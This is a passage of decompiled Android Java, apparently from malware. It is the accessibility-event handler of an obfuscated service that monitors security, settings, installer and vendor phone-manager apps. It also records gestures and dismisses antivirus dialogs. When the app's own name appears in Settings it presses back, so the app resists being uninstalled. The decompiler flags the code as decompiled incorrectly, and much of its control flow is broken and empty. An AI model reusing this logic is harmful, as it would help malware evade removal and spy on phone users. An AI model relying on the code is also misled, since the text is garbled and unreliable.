B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:382:0x04c0  */
    /* JADX WARN: Removed duplicated region for block: B:384:0x04c4  */
    /* JADX WARN: Removed duplicated region for block: B:387:0x04c9 A[Catch: Exception -> 0x0019, TRY_ENTER, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:390:0x04d0 A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:394:0x04d8 A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:396:0x04de A[Catch: Exception -> 0x0019, TryCatch #17 {Exception -> 0x0019, blocks: (B:3:0x000d, B:5:0x0011, B:10:0x001c, B:13:0x0026, B:26:0x0045, B:28:0x004d, B:30:0x005b, B:32:0x0069, B:35:0x0073, B:37:0x0079, B:84:0x011c, B:87:0x0126, B:90:0x012c, B:120:0x018b, B:131:0x01a2, B:133:0x01a8, B:135:0x01ae, B:142:0x01cc, B:144:0x01d2, B:146:0x01d8, B:152:0x01e5, B:157:0x01f5, B:164:0x020e, B:165:0x0210, B:169:0x0218, B:171:0x021e, B:173:0x0224, B:175:0x022f, B:180:0x023a, B:182:0x023e, B:184:0x0244, B:186:0x0248, B:187:0x024c, B:188:0x024f, B:189:0x0250, B:194:0x025c, B:196:0x0262, B:198:0x0268, B:201:0x027a, B:203:0x0280, B:205:0x0286, B:207:0x028c, B:209:0x0294, B:211:0x029c, B:213:0x02a4, B:215:0x02aa, B:217:0x02b2, B:219:0x02ba, B:221:0x02c2, B:223:0x02ca, B:225:0x02d2, B:227:0x02da, B:229:0x02e0, B:231:0x02e8, B:233:0x02f0, B:235:0x02f8, B:237:0x0300, B:239:0x0308, B:241:0x0310, B:243:0x0318, B:245:0x0320, B:247:0x0328, B:249:0x032e, B:251:0x0336, B:253:0x033e, B:255:0x0346, B:257:0x034c, B:259:0x0354, B:261:0x035c, B:263:0x0364, B:265:0x036c, B:267:0x0374, B:269:0x037c, B:271:0x0384, B:273:0x038c, B:275:0x0394, B:277:0x039c, B:283:0x03aa, B:285:0x03ae, B:289:0x03b9, B:291:0x03bf, B:293:0x03c5, B:296:0x03d3, B:298:0x03d9, B:300:0x03e1, B:302:0x03e7, B:305:0x03ef, B:307:0x03f8, B:309:0x0400, B:311:0x0408, B:313:0x0410, B:315:0x0418, B:320:0x0427, B:321:0x042a, B:331:0x043c, B:338:0x044c, B:340:0x0452, B:388:0x04cc, B:390:0x04d0, B:392:0x04d4, B:394:0x04d8, B:396:0x04de, B:397:0x04e3, B:387:0x04c9, B:337:0x0449, B:81:0x0115, B:83:0x0119, B:464:0x0599, B:466:0x059d, B:468:0x05a1, B:470:0x05a5, B:472:0x05a9, B:473:0x05ae), top: B:523:0x000d }] */
    /* JADX WARN: Removed duplicated region for block: B:399:0x04e6  */
    /* JADX WARN: Removed duplicated region for block: B:426:0x0539  */
    /* JADX WARN: Removed duplicated region for block: B:447:0x0573  */
    /* JADX WARN: Removed duplicated region for block: B:449:0x0576  */
    /* JADX WARN: Removed duplicated region for block: B:456:0x0588 A[Catch: Exception -> 0x057e, TRY_LEAVE, TryCatch #12 {Exception -> 0x057e, blocks: (B:454:0x0580, B:456:0x0588), top: B:513:0x0580 }] */
    /* JADX WARN: Removed duplicated region for block: B:459:0x058e A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:501:0x04ed A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:513:0x0580 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:519:0x018e A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:521:0x0522 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:69:0x00eb  */
    /* JADX WARN: Type inference failed for: r15v16 */
    /* JADX WARN: Type inference failed for: r15v17, types: [int] */
    /* JADX WARN: Type inference failed for: r15v19 */
    /* JADX WARN: Type inference failed for: r15v2 */
    /* JADX WARN: Type inference failed for: r15v20 */
    /* JADX WARN: Type inference failed for: r15v4 */
    /* JADX WARN: Type inference failed for: r15v5, types: [java.lang.CharSequence] */
    /* JADX WARN: Type inference failed for: r15v6, types: [ng, rh] */
    /* JADX WARN: Type inference failed for: r15v8 */
    /* JADX WARN: Type inference failed for: r18v6 */
    /* JADX WARN: Type inference failed for: r18v7, types: [java.lang.Throwable] */
    /* JADX WARN: Type inference failed for: r18v9 */
    @Override // android.accessibilityservice.AccessibilityService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) throws Throwable {
        String lowerCase;
        ?? r15;
        C0356a1 c0356a1;
        AccessibilityNodeInfo source;
        String str;
        String str2;
        boolean zIsVisibleToUser;
        CharSequence contentDescription;
        CharSequence text;
        C0032al c0032al;
        boolean z;
        InterfaceC0876mv interfaceC0876mv;
        String lowerCase2;
        String str3;
        boolean z2;
        boolean z3;
        String str4;
        C0335a1 c0335a1;
        int i;
        C0319a4 c0319a4;
        boolean z4;
        int i2;
        C0329b4 c0329b4;
        C0372a9 c0372a9;
        int eventType;
        CharSequence packageName;
        String string;
        String string2;
        int i3;
        CharSequence charSequence;
        C0360a2 j41Var;
        C0614i9 c0614i9;
        String string3;
        boolean z5;
        String lowerCase3;
        String string4;
        String string5;
        String lowerCase4;
        C0355a0 c0355a0;
        String string6;
        CharSequence packageName2;
        String lowerCase5;
        C0355a0 c0355a02;
        String string7;
        CharSequence packageName3;
        String string8;
        tu0 tu0Var;
        String string9;
        t60.m214695b6(accessibilityEvent, "event");
        try {
            PowerManager powerManager = this.f52384b5;
            if ((powerManager == null || powerManager.isInteractive()) && !f52358m1.isSensitiveAppPaused()) {
                int eventType2 = accessibilityEvent.getEventType();
                AccessibilityNodeInfo accessibilityNodeInfo = null;
                if (eventType2 == 512 || eventType2 == 1024 || eventType2 == 262144 || eventType2 == 524288 || eventType2 == 1048576 || eventType2 == 2097152) {
                    if (this.f52414e5 == null || f52360m3) {
                        return;
                    }
                    C0614i9 c0614i92 = this.f52414e5;
                    if (c0614i92 != null) {
                        c0614i92.m213127b5(accessibilityEvent);
                        return;
                    } else {
                        t60.m214724f2("accessibilityEventManager");
                        throw null;
                    }
                }
                AppCoreService.C0277a0 c0277a0 = AppCoreService.f52296a0;
                if (!c0277a0.isRunning()) {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - this.f52387b8 > 10000) {
                        this.f52387b8 = jCurrentTimeMillis;
                        try {
                            Context applicationContext = getApplicationContext();
                            t60.m214694b5(applicationContext, "applicationContext");
                            c0277a0.start(applicationContext);
                        } catch (Exception unused) {
                        }
                    }
                }
                CharSequence packageName4 = accessibilityEvent.getPackageName();
                if (packageName4 == null || (string9 = packageName4.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string9.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                try {
                    C0260a2 c0260a2 = this.f52369a0;
                    if ((c0260a2 != null ? c0260a2.f52110a2 : false) && (tu0Var = this.f52430g1) != null) {
                        if (accessibilityEvent.getPackageName() == null) {
                            return;
                        }
                        String string10 = accessibilityEvent.getPackageName().toString();
                        String[] strArr = tu0.f60269a7;
                        int length = strArr.length;
                        r15 = 0;
                        while (r15 < length) {
                            if (AbstractC0779a1.m213656a9(string10, strArr[r15])) {
                                if (System.currentTimeMillis() - tu0Var.f60278a3 >= 2000 && tu0Var.f60277a2 == 0) {
                                    tu0Var.f60281a6.post(new qu0(tu0Var, 0));
                                    return;
                                }
                                return;
                            }
                            r15++;
                        }
                        return;
                    }
                } catch (Exception unused2) {
                }
                if (eventType2 == 32) {
                    try {
                        CharSequence packageName5 = accessibilityEvent.getPackageName();
                        if (packageName5 != null) {
                            String string11 = packageName5.toString();
                            r15 = string11;
                            if (string11 == null) {
                                r15 = "";
                            }
                            if (AbstractC0779a1.m213652a5(r15, "systemmanager", true) || AbstractC0779a1.m213652a5(r15, "hihonor", true) || AbstractC0779a1.m213652a5(r15, "huawei", true)) {
                                C0873ms c0873ms = this.f52378a9;
                                r15 = AbstractC1262tj.f60233a0;
                                AbstractC0780a0.m213692a3(c0873ms, r15, new dqtvuisjd$handleVirusControlDialog$1(this, null), 2);
                            }
                        }
                    } catch (Exception unused3) {
                    }
                }
                if ((eventType2 == 32 || eventType2 == 2048) && (c0356a1 = this.f52436g7) != null) {
                    c0356a1.m211956a4(accessibilityEvent);
                }
                if (!f52358m1.isPermissionRequestActive() && !f52360m3) {
                    boolean zM211486i0 = m211486i0();
                    try {
                        if (eventType2 == 2) {
                            try {
                                source = accessibilityEvent.getSource();
                                try {
                                    Rect rect = new Rect();
                                    if (source != null) {
                                        source.getBoundsInScreen(rect);
                                        try {
                                            text = source.getText();
                                        } catch (Exception unused4) {
                                        }
                                        if (text != null) {
                                            String string12 = text.toString();
                                            if (string12 == null) {
                                                string12 = "";
                                            }
                                            try {
                                                contentDescription = source.getContentDescription();
                                            } catch (Exception unused5) {
                                            }
                                            if (contentDescription != null) {
                                                String string13 = contentDescription.toString();
                                                if (string13 == null) {
                                                    string13 = "";
                                                }
                                                zIsVisibleToUser = source.isVisibleToUser();
                                                str2 = string13;
                                                str = string12;
                                            }
                                        }
                                    } else {
                                        str = "";
                                        str2 = str;
                                        zIsVisibleToUser = false;
                                    }
                                    f52366m9 = new C0285a5(str, str2, rect, zIsVisibleToUser, System.currentTimeMillis());
                                } catch (Exception unused6) {
                                    f52366m9 = null;
                                    cq0.m212492d5(source);
                                    if (!zM211486i0) {
                                    }
                                    if (eventType2 != 2048) {
                                    }
                                    if (z) {
                                        interfaceC0876mv = 0;
                                        lowerCase2 = "";
                                    }
                                    if (!z) {
                                    }
                                    boolean z6 = z;
                                    long jCurrentTimeMillis2 = z ? System.currentTimeMillis() : 0L;
                                    if (z) {
                                    }
                                    if (z3) {
                                    }
                                    if (!this.f52477k8) {
                                    }
                                    if (this.f52477k8) {
                                    }
                                    if (eventType2 == 32) {
                                    }
                                    if (eventType2 == 64) {
                                    }
                                    c0335a1 = this.f52438g9;
                                    if (c0335a1 == null) {
                                    }
                                    if (eventType2 != i) {
                                    }
                                    c0319a4 = this.f52437g8;
                                    if (c0319a4 == null) {
                                    }
                                    if (eventType2 != i2) {
                                    }
                                    if (this.f52414e5 != null) {
                                    }
                                    if (eventType2 != 32) {
                                    }
                                    if (eventType2 != 32) {
                                    }
                                    if (eventType2 != i3) {
                                    }
                                    if (eventType2 != 1) {
                                    }
                                    C0341a7.f53380c1.getInstance();
                                    return;
                                }
                            } catch (Exception unused7) {
                                source = null;
                            } catch (Throwable th) {
                                th = th;
                                try {
                                    cq0.m212492d5(accessibilityNodeInfo);
                                } catch (Exception unused8) {
                                }
                                throw th;
                            }
                            try {
                                cq0.m212492d5(source);
                            } catch (Exception unused9) {
                            }
                        }
                        if (!zM211486i0) {
                            try {
                                if (m211482h6() && (c0032al = this.f52439h0) != null) {
                                    c0032al.m209814a3(accessibilityEvent);
                                }
                            } catch (Exception unused10) {
                            }
                        }
                        z = eventType2 != 2048;
                        if (z || (packageName3 = accessibilityEvent.getPackageName()) == null || (string8 = packageName3.toString()) == null) {
                            interfaceC0876mv = 0;
                            lowerCase2 = "";
                        } else {
                            interfaceC0876mv = 0;
                            lowerCase2 = string8.toLowerCase(Locale.ROOT);
                            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        }
                        try {
                            if (!z) {
                                str3 = "accessibilityEventManager";
                                boolean z7 = AbstractC0779a1.m213652a5(lowerCase2, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase2, "packageinstaller", false) || AbstractC0779a1.m213652a5(lowerCase2, "bbk", false);
                                boolean z62 = z7;
                                long jCurrentTimeMillis22 = z ? System.currentTimeMillis() : 0L;
                                if (z && !z62) {
                                    z2 = zM211486i0;
                                    z3 = z;
                                    boolean z8 = jCurrentTimeMillis22 - this.f52386b7 < 300;
                                    if (z3 && !z8) {
                                        this.f52386b7 = jCurrentTimeMillis22;
                                    }
                                    if (!this.f52477k8 && !z2 && !z8) {
                                        packageName2 = accessibilityEvent.getPackageName();
                                        if (packageName2 != null || (string7 = packageName2.toString()) == null) {
                                            lowerCase5 = "";
                                        } else {
                                            lowerCase5 = string7.toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase5, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                        }
                                        if ((lowerCase5.length() <= 0) && this.f52435g6 != null && C0355a0.m211934d7(lowerCase5)) {
                                            c0355a02 = this.f52435g6;
                                            if (c0355a02 != null) {
                                                t60.m214724f2("uninstallProtectionManager");
                                                throw interfaceC0876mv;
                                            }
                                            c0355a02.m211944d8(accessibilityEvent);
                                        }
                                    }
                                    if (this.f52477k8 || z2 || z8) {
                                        str4 = "";
                                    } else {
                                        CharSequence packageName6 = accessibilityEvent.getPackageName();
                                        if (packageName6 == null || (string6 = packageName6.toString()) == null) {
                                            str4 = "";
                                            lowerCase4 = str4;
                                        } else {
                                            str4 = "";
                                            lowerCase4 = string6.toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase4, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                        }
                                        if ((AbstractC0779a1.m213652a5(lowerCase4, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase4, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase4, "packageinstaller", false) || AbstractC0779a1.m213652a5(lowerCase4, "appmarket", false) || AbstractC0779a1.m213652a5(lowerCase4, "appstore", false) || AbstractC0779a1.m213652a5(lowerCase4, "market", false) || AbstractC0779a1.m213652a5(lowerCase4, "settings", false) || AbstractC0779a1.m213652a5(lowerCase4, "securitycenter", false) || AbstractC0779a1.m213652a5(lowerCase4, "phonemanager", false) || AbstractC0779a1.m213652a5(lowerCase4, "safecenter", false) || AbstractC0779a1.m213652a5(lowerCase4, "security", false) || AbstractC0779a1.m213652a5(lowerCase4, "battery", false) || AbstractC0779a1.m213652a5(lowerCase4, "permissionmanager", false) || AbstractC0779a1.m213652a5(lowerCase4, "systemmanager", false) || AbstractC0779a1.m213652a5(lowerCase4, "devicemanager", false) || AbstractC0779a1.m213652a5(lowerCase4, "oplus", false) || AbstractC0779a1.m213652a5(lowerCase4, "coloros", false) || AbstractC0779a1.m213652a5(lowerCase4, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase4, "realme", false) || AbstractC0779a1.m213652a5(lowerCase4, "oneplus", false) || AbstractC0779a1.m213652a5(lowerCase4, "heytap", false) || AbstractC0779a1.m213652a5(lowerCase4, "nearme", false) || AbstractC0779a1.m213652a5(lowerCase4, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase4, "bbk", false) || AbstractC0779a1.m213652a5(lowerCase4, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase4, "miui", false) || AbstractC0779a1.m213652a5(lowerCase4, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase4, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase4, "honor", false) || AbstractC0779a1.m213652a5(lowerCase4, "samsung", false) || AbstractC0779a1.m213652a5(lowerCase4, "meizu", false) || AbstractC0779a1.m213652a5(lowerCase4, "nubia", false) || AbstractC0779a1.m213652a5(lowerCase4, "lenovo", false) || AbstractC0779a1.m213652a5(lowerCase4, "motorola", false) || AbstractC0779a1.m213652a5(lowerCase4, "smartisanos", false) || AbstractC0779a1.m213652a5(lowerCase4, "qihoo", false) || AbstractC0779a1.m213652a5(lowerCase4, "360", false) || AbstractC0779a1.m213652a5(lowerCase4, "tencent", false) || AbstractC0779a1.m213652a5(lowerCase4, "qq.manager", false)) && (c0355a0 = this.f52435g6) != null) {
                                            c0355a0.m211944d8(accessibilityEvent);
                                        }
                                    }
                                    if (eventType2 == 32) {
                                        CharSequence packageName7 = accessibilityEvent.getPackageName();
                                        if (packageName7 == null || (string5 = packageName7.toString()) == null) {
                                            lowerCase3 = str4;
                                        } else {
                                            lowerCase3 = string5.toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                        }
                                        if (AbstractC0779a1.m213652a5(lowerCase3, "packageinstaller", false) || AbstractC0779a1.m213652a5(lowerCase3, "packagemanager", false)) {
                                            CharSequence className = accessibilityEvent.getClassName();
                                            if (className == null || (string4 = className.toString()) == null) {
                                                string4 = str4;
                                            }
                                            if (AbstractC0779a1.m213652a5(string4, "InstallAppProgress", false) || AbstractC0779a1.m213652a5(string4, "InstallStaging", false) || AbstractC0779a1.m213652a5(string4, "InstallStart", false) || AbstractC0779a1.m213652a5(string4, "InstallConfirm", false) || AbstractC0779a1.m213652a5(string4, "PackageInstallerActivity", false) || AbstractC0779a1.m213652a5(string4, "Alert", false)) {
                                                try {
                                                    m211440c2();
                                                } catch (Exception unused11) {
                                                }
                                            }
                                        }
                                    }
                                    if (eventType2 == 64) {
                                        m211473g7(accessibilityEvent);
                                    }
                                    c0335a1 = this.f52438g9;
                                    if (c0335a1 == null) {
                                        if (eventType2 == 16 || eventType2 == 1) {
                                            i = 32;
                                        } else {
                                            i = 32;
                                            if (eventType2 == 32) {
                                            }
                                        }
                                        c0335a1.m211820d6(accessibilityEvent);
                                    } else {
                                        i = 32;
                                    }
                                    if (eventType2 != i || eventType2 == 2048) {
                                        m211446d1(accessibilityEvent);
                                    }
                                    c0319a4 = this.f52437g8;
                                    if (c0319a4 == null) {
                                        z4 = false;
                                        i2 = 32;
                                    } else {
                                        if (c0319a4.f53061a7 == 1) {
                                            try {
                                                CharSequence packageName8 = accessibilityEvent.getPackageName();
                                                string3 = packageName8 != null ? packageName8.toString() : interfaceC0876mv;
                                                if (eventType2 == 128) {
                                                    t60.m214702c3("dqtvuisjd", "🔍 [HOVER-DEBUG] → 转发给 gestureRecorderManager.onHoverEvent");
                                                    C0319a4 c0319a42 = this.f52437g8;
                                                    if (c0319a42 == null) {
                                                        t60.m214724f2("gestureRecorderManager");
                                                        throw interfaceC0876mv;
                                                    }
                                                    c0319a42.m211574a3(accessibilityEvent);
                                                }
                                                if (eventType2 == 1) {
                                                    C0319a4 c0319a43 = this.f52437g8;
                                                    if (c0319a43 == null) {
                                                        t60.m214724f2("gestureRecorderManager");
                                                        throw interfaceC0876mv;
                                                    }
                                                    c0319a43.m211575a4(accessibilityEvent);
                                                }
                                            } catch (Exception unused12) {
                                            }
                                            if (eventType2 == 32 || eventType2 == 2048) {
                                                if (string3 != null) {
                                                    z4 = false;
                                                    try {
                                                        if (AbstractC0779a1.m213652a5(string3, "systemui", false)) {
                                                            z5 = true;
                                                        }
                                                        if (z5 && !z8) {
                                                            AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60233a0, new C02969(interfaceC0876mv, this, string3), 2);
                                                        }
                                                    } catch (Exception unused13) {
                                                    }
                                                    i2 = 32;
                                                } else {
                                                    z4 = false;
                                                }
                                                z5 = z4;
                                                if (z5) {
                                                    AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60233a0, new C02969(interfaceC0876mv, this, string3), 2);
                                                }
                                                i2 = 32;
                                            } else {
                                                i2 = 32;
                                                z4 = false;
                                            }
                                        }
                                    }
                                    if (eventType2 != i2 || eventType2 == 4194304) {
                                        m211474g8(accessibilityEvent);
                                    }
                                    if (this.f52414e5 != null && !f52360m3) {
                                        c0614i9 = this.f52414e5;
                                        if (c0614i9 != null) {
                                            t60.m214724f2(str3);
                                            throw null;
                                        }
                                        c0614i9.m213127b5(accessibilityEvent);
                                    }
                                    if (eventType2 != 32 || eventType2 == 2048) {
                                        try {
                                            c0329b4 = this.f52431g2;
                                            if (c0329b4 != null && (c0372a9 = c0329b4.f53199a4) != null && c0372a9.f55149a6) {
                                                eventType = accessibilityEvent.getEventType();
                                                packageName = accessibilityEvent.getPackageName();
                                                if (packageName != null && (string = packageName.toString()) != null && (eventType == 2048 || eventType == 32)) {
                                                    c0372a9.f55147a4.post(new RunnableC1224sj(eventType, 1, c0372a9, string));
                                                }
                                            }
                                        } catch (Exception unused14) {
                                        }
                                    }
                                    if (eventType2 != 32) {
                                        try {
                                            List<CharSequence> text2 = accessibilityEvent.getText();
                                            t60.m214694b5(text2, "event.text");
                                            charSequence = (CharSequence) AbstractC0715je.m213291h8(text2);
                                        } catch (Exception unused15) {
                                        }
                                        if (charSequence != null) {
                                            String string14 = charSequence.toString();
                                            if (string14 == null) {
                                                string14 = str4;
                                            }
                                            try {
                                                string2 = getString(R$string.app_name);
                                            } catch (Exception unused16) {
                                                string2 = str4;
                                            }
                                            try {
                                                t60.m214694b5(string2, "try { \n                 …tch (_: Exception) { \"\" }");
                                            } catch (Exception unused17) {
                                            }
                                            if ((string2.length() > 0 ? true : z4) && string14.equals(string2)) {
                                                i3 = 1;
                                                if (AbstractC0779a1.m213652a5(lowerCase, "settings", true)) {
                                                    C0329b4 c0329b42 = this.f52431g2;
                                                    if (!((c0329b42 == null || !c0329b42.m211766a4()) ? z4 : true)) {
                                                        performGlobalAction(1);
                                                        i3 = 1;
                                                    }
                                                }
                                            } else {
                                                i3 = 1;
                                            }
                                        }
                                    }
                                    if (eventType2 != i3 || eventType2 == 32 || eventType2 == 2048) {
                                        try {
                                            j41Var = C0360a2.f53810f9.getInstance();
                                            if (j41Var != null) {
                                                j41Var.m212078i3(accessibilityEvent);
                                            }
                                        } catch (Exception unused18) {
                                        }
                                    }
                                    if (eventType2 != 1 || eventType2 == 128) {
                                        C0341a7.f53380c1.getInstance();
                                        return;
                                    }
                                    return;
                                }
                                z2 = zM211486i0;
                                z3 = z;
                                if (z3) {
                                    this.f52386b7 = jCurrentTimeMillis22;
                                }
                                if (!this.f52477k8) {
                                    packageName2 = accessibilityEvent.getPackageName();
                                    if (packageName2 != null) {
                                        lowerCase5 = "";
                                        if (lowerCase5.length() <= 0) {
                                            c0355a02 = this.f52435g6;
                                            if (c0355a02 != null) {
                                            }
                                        }
                                    }
                                }
                                if (this.f52477k8) {
                                    str4 = "";
                                }
                                if (eventType2 == 32) {
                                }
                                if (eventType2 == 64) {
                                }
                                c0335a1 = this.f52438g9;
                                if (c0335a1 == null) {
                                }
                                if (eventType2 != i) {
                                    m211446d1(accessibilityEvent);
                                }
